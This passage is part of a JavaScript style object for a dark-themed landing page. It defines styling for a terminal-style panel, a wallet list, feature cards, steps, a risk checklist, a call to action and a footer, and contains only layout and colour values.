    justifyContent: 'center',
  },
  terminalWindow: {
    width: '100%',
    maxWidth: '680px',
    background: '#12121a',
    border: '1px solid #1e1e2a',
    borderRadius: '12px',
    overflow: 'hidden',
    fontFamily: "'Courier New', monospace",
    fontSize: '13px',
  },
  terminalHeader: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: '12px 16px',
    borderBottom: '1px solid #1e1e2a',
    background: '#16161f',
  },
  terminalStatus: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    color: '#00e68a',
    fontWeight: 700,
    fontSize: '11px',
    textTransform: 'uppercase',
    letterSpacing: '1px',
  },
  terminalCheck: {
    color: '#5a5a6a',
    fontWeight: 400,
    textTransform: 'none',
    letterSpacing: 0,
  },
  terminalTitle: {
    color: '#5a5a6a',
    fontSize: '11px',
  },
  terminalBody: {
    padding: '20px',
    lineHeight: 2,
    maxHeight: '320px',
    overflowY: 'auto',
  },
  tCommand: { color: '#e8e8ed', fontWeight: 700 },
  tKey: { color: '#8a8a9a' },
  tLive: { color: '#00e68a', fontStyle: 'italic' },
  tOpen: { color: '#00e68a', fontStyle: 'italic' },
  tReviewed: { color: '#f0c040', fontStyle: 'italic' },
  tReady: { color: '#00e68a', fontStyle: 'italic' },
  tSet: { color: '#4a9eff', fontStyle: 'italic' },
  tTarget: { color: '#f0c040', fontWeight: 700 },
  tConfirm: { color: '#5a5a6a', animation: 'ss-blink 1.2s infinite' },
  tComment: { color: '#5a5a6a', fontStyle: 'italic' },
  walletsSection: {
    padding: '40px',
    textAlign: 'center',
    borderTop: '1px solid #1e1e2a',
    borderBottom: '1px solid #1e1e2a',
  },
  walletsLabel: {
    fontSize: '12px',
    color: '#5a5a6a',
    marginBottom: '20px',
    textTransform: 'uppercase',
    letterSpacing: '1px',
  },
  walletsList: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    gap: '40px',
    flexWrap: 'wrap',
  },
  walletItem: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    color: '#8a8a9a',
    fontSize: '14px',
    fontWeight: 500,
  },
  walletIcon: {
    width: '24px', height: '24px',
    borderRadius: '6px',
    background: '#16161f',
    border: '1px solid #1e1e2a',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontSize: '12px',
  },
  featuresSection: {
    padding: '100px 40px',
    maxWidth: '1100px',
    margin: '0 auto',
  },
  featuresGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(3, 1fr)',
    gap: '24px',
  },
  featureCard: {
    background: '#12121a',
    border: '1px solid #1e1e2a',
    borderRadius: '12px',
    padding: '32px',
    transition: 'border-color 0.2s',
  },
  featureNumber: {
    fontSize: '12px',
    color: '#5a5a6a',
    fontFamily: "'Courier New', monospace",
    marginBottom: '16px',
  },
  featureTitle: {
    fontSize: '17px',
    fontWeight: 700,
    marginBottom: '10px',
  },
  featureDesc: {
    fontSize: '14px',
    color: '#8a8a9a',
    lineHeight: 1.6,
  },
  howSection: {
    padding: '100px 40px',
    maxWidth: '800px',
    margin: '0 auto',
  },
  sectionLabel: {
    fontSize: '12px',
    color: '#00e68a',
    textTransform: 'uppercase',
    letterSpacing: '2px',
    marginBottom: '12px',
    fontWeight: 600,
  },
  sectionTitle: {
    fontSize: 'clamp(28px, 3.5vw, 40px)',
    fontWeight: 800,
    marginBottom: '16px',
    letterSpacing: '-0.5px',
  },
  sectionDesc: {
    fontSize: '16px',
    color: '#8a8a9a',
    marginBottom: '48px',
    lineHeight: 1.7,
    maxWidth: '600px',
  },
  stepsList: {
    display: 'flex',
    flexDirection: 'column',
    gap: '32px',
  },
  stepItem: {
    display: 'flex',
    gap: '20px',
    alignItems: 'flex-start',
  },
  stepNum: {
    fontSize: '13px',
    fontWeight: 700,
    color: '#00e68a',
    fontFamily: "'Courier New', monospace",
    minWidth: '28px',
    paddingTop: '2px',
  },
  stepTitle: {
    fontSize: '16px',
    fontWeight: 700,
    marginBottom: '6px',
  },
  stepDesc: {
    fontSize: '14px',
    color: '#8a8a9a',
    lineHeight: 1.6,
  },
  riskSection: {
    padding: '100px 40px',
    maxWidth: '800px',
    margin: '0 auto',
  },
  riskList: {
    display: 'flex',
    flexWrap: 'wrap',
    gap: '12px',
    marginTop: '32px',
  },
  riskItem: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    padding: '10px 16px',
    background: '#12121a',
    border: '1px solid #1e1e2a',
    borderRadius: '8px',
    fontSize: '13px',
    color: '#8a8a9a',
  },
  riskCheck: { color: '#00e68a', fontSize: '14px' },
  ctaSection: {
    padding: '100px 40px',
    textAlign: 'center',
    borderTop: '1px solid #1e1e2a',
  },
  ctaTitle: {
    fontSize: 'clamp(28px, 3.5vw, 40px)',
    fontWeight: 800,
    marginBottom: '16px',
  },
  ctaDesc: {
    fontSize: '15px',
    color: '#8a8a9a',
    marginBottom: '32px',
    maxWidth: '480px',
    marginLeft: 'auto',
    marginRight: 'auto',
  },
  footer: {
    padding: '40px',
    textAlign: 'center',
    borderTop: '1px solid #1e1e2a',
  },
  footerText: {
    fontSize: '12px',
    color: '#5a5a6a',
    maxWidth: '600px',
    margin: '0 auto',
    lineHeight: 1.7,
  },
};